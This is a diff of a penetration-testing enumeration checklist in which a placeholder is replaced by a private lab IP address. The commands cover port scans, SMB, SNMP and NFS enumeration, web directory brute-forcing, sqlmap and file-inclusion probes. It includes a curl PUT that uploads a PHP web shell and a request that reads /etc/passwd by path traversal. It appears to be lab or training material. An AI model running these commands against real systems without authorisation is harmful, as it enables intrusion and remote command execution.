@@ -18,23 +18,23 @@ INSERTTCPSCAN
 Always start with a stealthy scan to avoid closing ports.
 
 # Syn-scan
-nmap -sS INSERTIPADDRESS
+nmap -sS 192.168.118.194
 
 # Scan all ports, might take a while.
-nmap INSERTIPADDRESS -p-
+nmap 192.168.118.194 -p-
 
 # Service-version, default scripts, OS:
-nmap INSERTIPADDRESS -sV -sC -O -p 111,222,333
+nmap 192.168.118.194 -sV -sC -O -p 111,222,333
 
 # Scan for UDP
-nmap INSERTIPADDRESS -sU
-unicornscan -mU -v -I INSERTIPADDRESS
+nmap 192.168.118.194 -sU
+unicornscan -mU -v -I 192.168.118.194
 
 # Connect to udp if one is open
-nc -u INSERTIPADDRESS 48772
+nc -u 192.168.118.194 48772
 
 # Monster scan
-nmap INSERTIPADDRESS -p- -A -T4 -sC
+nmap 192.168.118.194 -p- -A -T4 -sC
 ```
 
 
@@ -48,7 +48,7 @@ INSERTFTPTEST
 
 
 ```
-nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 INSERTIPADDRESS
+nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 192.168.118.194
 ```
 
 ### Port 22 - SSH
@@ -61,7 +61,7 @@ nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-
 INSERTSSHCONNECT
 
 ```
-nc INSERTIPADDRESS 22
+nc 192.168.118.194 22
 ```
 
 ### Port 25
@@ -74,13 +74,13 @@ INSERTSMTPCONNECT
 
 
 ```
-nc -nvv INSERTIPADDRESS 25
+nc -nvv 192.168.118.194 25
 HELO foo<cr><lf>
 
-telnet INSERTIPADDRESS 25
+telnet 192.168.118.194 25
 VRFY root
 
-nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 INSERTIPADDRESS
+nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 192.168.118.194
 ```
 
 ### Port 69 - UDP - TFTP
@@ -96,8 +96,8 @@ This is used for tftp-server.
 INSERTPOP3CONNECT
 
 ```
-telnet INSERTIPADDRESS 110
-USER pelle@INSERTIPADDRESS
+telnet 192.168.118.194 110
+USER pelle@192.168.118.194
 PASS admin
 
 or:
@@ -115,7 +115,7 @@ retr 9
 ### Port 111 - Rpcbind
 
 ```
-rpcinfo -p INSERTIPADDRESS
+rpcinfo -p 192.168.118.194
 ```
 
 
@@ -135,11 +135,11 @@ Some versions are vulnerable.
 
 
 ```
-nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse INSERTIPADDRESS -p 445
+nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse 192.168.118.194 -p 445
 
 
-enum4linux -a INSERTIPADDRESS
-rpcclient -U "" INSERTIPADDRESS
+enum4linux -a 192.168.118.194
+rpcclient -U "" 192.168.118.194
 	srvinfo
 	enumdomusers
 	getdompwinfo
@@ -147,18 +147,18 @@ rpcclient -U "" INSERTIPADDRESS
 	netshareenum
 	netshareenumall
 
-smbclient -L INSERTIPADDRESS
-smbclient //INSERTIPADDRESS/tmp
-smbclient \\\\INSERTIPADDRESS\\ipc$ -U john
-smbclient //INSERTIPADDRESS/ipc$ -U john  
+smbclient -L 192.168.118.194
+smbclient //192.168.118.194/tmp
+smbclient \\\\192.168.118.194\\ipc$ -U john
+smbclient //192.168.118.194/ipc$ -U john  
 ```
 
 
 ### Port 161/162 UDP - SNMP
 
 ```
-nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes INSERTIPADDRESS
-snmp-check -t INSERTIPADDRESS -c public
+nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes 192.168.118.194
+snmp-check -t 192.168.118.194 -c public
 ```
 
 ```
@@ -183,19 +183,19 @@ Used by RPC to connect in domain network.
 - Password protected:
 
 ```
-tnscmd10g version -h INSERTIPADDRESS
-tnscmd10g status -h INSERTIPADDRESS
+tnscmd10g version -h 192.168.118.194
+tnscmd10g status -h 192.168.118.194
 ```
 
 ### Port 2049 - NFS
 
 ```
-showmount -e INSERTIPADDRESS
+showmount -e 192.168.118.194
 
 If you find anything you can mount it like this:
 
-mount INSERTIPADDRESS:/ /tmp/NFS
-mount -t INSERTIPADDRESS:/ /tmp/NFS
+mount 192.168.118.194:/ /tmp/NFS
+mount -t 192.168.118.194:/ /tmp/NFS
 ```
 
 ### Port 2100 - Oracle XML DB
@@ -219,9 +219,9 @@ https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm
 - Version:
 
 ```
-nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse INSERTIPADDRESS -p 3306
+nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse 192.168.118.194 -p 3306
 
-mysql --host=INSERTIPADDRESS -u root -p
+mysql --host=192.168.118.194 -u root -p
 ```
 
 ### Port 3339 - Oracle web interface
@@ -252,28 +252,28 @@ INSERTCURLHEADER
 
 ```
 # Nikto
-nikto -h http://INSERTIPADDRESS
+nikto -h http://192.168.118.194
 
 # Nikto with squid proxy
-nikto -h INSERTIPADDRESS -useproxy http://INSERTIPADDRESS:4444
+nikto -h 192.168.118.194 -useproxy http://192.168.118.194:4444
 
 # Get header
-curl -i INSERTIPADDRESS
+curl -i 192.168.118.194
 
 # Get everything
-curl -i -L INSERTIPADDRESS
+curl -i -L 192.168.118.194
 
 # Check for title and all links
-curl INSERTIPADDRESS -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'
+curl 192.168.118.194 -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'
 
 # Look at page with just text
-curl INSERTIPADDRESS -s -L | html2text -width '99' | uniq
+curl 192.168.118.194 -s -L | html2text -width '99' | uniq
 
 # Check if it is possible to upload
-curl -v -X OPTIONS http://INSERTIPADDRESS/
-curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://INSERTIPADDRESS/test/shell.php
+curl -v -X OPTIONS http://192.168.118.194/
+curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://192.168.118.194/test/shell.php
 
-dotdotpwn.pl -m http -h INSERTIPADDRESS -M GET -o unix
+dotdotpwn.pl -m http -h 192.168.118.194 -M GET -o unix
 ```
 
 #### Nikto scan
@@ -286,10 +286,10 @@ INSERTNIKTOSCAN
 
 ```
 # Not recursive
-dirb http://INSERTIPADDRESS -r -o dirb-INSERTIPADDRESS.txt
+dirb http://192.168.118.194 -r -o dirb-192.168.118.194.txt
 
 # Gobuster - remove relevant responde codes (403 for example)
-gobuster -u http://INSERTIPADDRESS -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
+gobuster -u http://192.168.118.194 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
 ```
 
 INSERTDIRBSCAN
@@ -325,11 +325,11 @@ username <servicename>
 
 
 ```
-fimap -u "http://INSERTIPADDRESS/example.php?test="
+fimap -u "http://192.168.118.194/example.php?test="
 
 # Ordered output
-curl -s http://INSERTIPADDRESS/gallery.php?page=/etc/passwd
-/root/Tools/Kadimus/kadimus -u http://INSERTIPADDRESS/example.php?page=
+curl -s http://192.168.118.194/gallery.php?page=/etc/passwd
+/root/Tools/Kadimus/kadimus -u http://192.168.118.194/example.php?page=
 ```
 
 #### SQL-Injection
@@ -339,10 +339,10 @@ curl -s http://INSERTIPADDRESS/gallery.php?page=/etc/passwd
 ./sqlmap.py -r search-test.txt -p tfUPass
 
 # Get
-sqlmap -u "http://INSERTIPADDRESS/index.php?id=1" --dbms=mysql
+sqlmap -u "http://192.168.118.194/index.php?id=1" --dbms=mysql
 
 # Crawl
-sqlmap -u http://INSERTIPADDRESS --dbms=mysql --crawl=3
+sqlmap -u http://192.168.118.194 --dbms=mysql --crawl=3
 ```
 
 #### Sql-login-bypass
@@ -368,7 +368,7 @@ Heartbleed:
 
 ```
 # Heartbleed
-sslscan INSERTIPADDRESS:443
+sslscan 192.168.118.194:443
 ```
 
 ## Vulnerability analysis
